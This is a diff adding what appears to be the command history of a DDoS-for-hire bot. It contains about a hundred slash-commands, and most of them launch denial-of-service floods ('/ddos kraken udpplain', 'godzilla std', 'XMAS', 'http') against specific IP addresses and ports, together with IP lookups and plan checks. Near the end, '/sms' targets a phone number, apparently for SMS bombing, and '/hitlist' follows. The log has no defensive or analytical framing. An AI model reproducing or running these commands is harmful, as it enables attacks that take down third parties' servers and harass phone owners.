@@ -1,0 +1,102 @@
+/ping 76.76.76.79
+/ping 76.76.76.79
+/ping 76.76.76.79
+/plan
+/plan
+/help
+/help
+/tr4p
+/tr4p
+/methods
+/methods
+/VPN
+/VPN
+/plan
+/ddos kraken ack 61.9.242.40 45
+/ddos kraken ack 61.9.242.40 22 45
+/servers
+/help
+/help
+/checkservers
+/ddos godzilla 61.9.242.40 22 45
+/ddos 61.9.242.40  godzilla 22 45
+/methods
+/ddos nfo-down godzilla 61.9.242.40 22 45
+/ddos godzilla nfo-down  61.9.242.40 22 45
+/methods
+/ddos godzilla std  61.9.242.40 22 45
+/ddos kraken squid  61.9.242.40 22 45
+/ipinfo 64.44.32.28
+/checkip 64.44.32.28
+/ddos kraken squid 64.44.32.28 22 45
+/ddos kraken std 64.44.32.28 22 45
+/ddos kraken std 64.44.32.28 22 45
+/ddos kraken udpplain 64.44.32.28 45 22
+/help
+/checkservers
+/ddos godzilla squid 64.44.32.28 22 45
+/ddos godzilla squid 64.44.32.28 45 22
+/ddos godzilla std 64.44.32.28 45 22
+/ddos kraken std 76.76.76.79 45 80
+/tr4p
+/tr4p
+/tr4p
+/plan
+/tr4p kraken ack 76.76.76.79 45
+/ddos kraken ack 76.76.76.79 45
+/ddos godzilla std 76.76.76.79 45 80
+/methods
+/ddos kraken udpplain 76.76.76.79 35 80
+/plan
+/plan
+/plan
+/plan
+/plan
+/ddos kraken udpplain 76.76.76.79 35 80
+/plan
+/ddos kraken udpplain 76.76.76.79 400 80
+/help
+/ipchecker
+/checkip
+/ipchecker 61.9.242.40
+/checkip 61.9.242.40
+/ddos kraken udpplain 61.9.242.40 22 45
+/ddos kraken udpplain 61.9.242.40 45 22
+/ddos kraken udpplain 64.44.32.28 45 22
+/claim KEY
+/serverinfo
+/ddos godzilla std 64.44.32.28 45 22
+/methods
+/ddos godzilla UDP 64.44.32.28 45 22
+/ddos kraken ack 76.76.76.79 45 80
+/methods
+/ddos kraken http 185.11.145.5 45 80
+/http 185.11.145.5 45 185.11.145.5  5000
+/ddos http 185.11.145.5  45
+/kraken http 185.11.145.5  45
+/ddos kraken std 61.9.242.40 45 22
+/ping 61.9.242.40
+/ddos godzilla std 61.9.242.40 45 22
+/ddos godzilla udpplain 61.9.242.40 100 22
+/ddos kraken udpplain 61.9.242.40 45 22
+/ping 61.9.242.40
+/ddos godzilla CUDP 61.9.242.40 45 22
+/ddos godzilla UDP 61.9.242.40 45 22
+/help
+/tr4p
+/help
+/ddos
+/tr4p
+/DDoS godzilla STD 89.41.26.231 35
+/methods
+/DDoS godzilla XMAS 89.41.26.231 35
+/DDoS godzilla UDP 89.41.26.231 22 35
+/DDoS godzilla UDP 117.27.239.28 60 22
+/plan
+/plan
+/terminal
+/help
+/ping 76.76.76.79
+/sms
+/sms 3433409800
+/hitlist
